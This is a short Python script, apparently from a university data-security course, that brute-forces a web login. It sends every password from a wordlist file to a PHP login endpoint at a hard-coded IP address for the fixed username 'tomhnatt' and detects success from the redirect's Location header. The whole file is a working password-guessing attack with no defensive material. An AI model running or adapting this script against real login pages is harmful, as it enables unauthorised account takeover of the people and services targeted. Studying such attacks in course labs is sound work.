import requests

# Configuration
login_url = "http://158.39.188.211/functions/passcheck.php"  # Updated login URL
username = "tomhnatt"
password_file_path = "/Users/stefan/Documents/Dev/Informatikk_HIOF/Datasikkerhet/password_combinations.txt"
success_indicator = "pgid="  # This is part of the query string we're expecting on a successful login redirect

# Function to attempt login with a given password
def attempt_login(password):
    data = {
        'username': username,
        'password': password,
    }
    response = requests.post(login_url, data=data, allow_redirects=False)
    # Check the Location header to see if it contains the pgid parameter, indicating a successful login
    location_header = response.headers.get('Location', '')
    if success_indicator in location_header:
        print(f"Success! Password is: {password}")
        return True
    return False

# Main logic
counter = 0
with open(password_file_path, 'r') as file:
    for line in file:
        password = line.strip()
        counter += 1
        if counter % 100 == 0:  # Print a message every 100 attempts to show progress
            print(f"Attempted {counter} passwords. Current: {password}")
        if attempt_login(password):
            print(f"Found successful password: {password}")
            break
    else:
        # This else clause belongs to the for loop and is executed when the loop completes normally (no breaks)
        print("Completed all attempts. No solution found.")
